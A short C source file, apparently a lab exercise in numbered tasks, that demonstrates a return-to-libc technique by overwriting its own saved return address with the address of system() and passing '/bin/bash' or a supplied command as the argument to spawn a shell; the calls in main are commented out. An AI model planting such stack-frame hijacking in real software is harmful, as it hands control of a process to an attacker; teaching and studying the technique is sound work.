#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

extern uint32_t* get_ebp(void);

void ret2libc_generic(char *cmd){
	uint32_t *curr_ebp = get_ebp();
	char *str = cmd;
	curr_ebp[2] = curr_ebp[1];
	curr_ebp[1] = (uint32_t) &system;
	curr_ebp[3] = (uint32_t) str;
}

void ret2libc(int dummy){
	//Task 1
	uint32_t *curr_ebp = get_ebp();
	
	//Task 4
	curr_ebp[2] = curr_ebp[1];
	
	//Task 2
	curr_ebp[1] = (uint32_t) &system;
	
	//Task 3
	char *str = "/bin/bash";
	curr_ebp[3] = (uint32_t) str;	
}

int main(){
	//ret2libc_generic("");
	//ret2libc(0);
	printf("Done!\n");
	return 0;
}
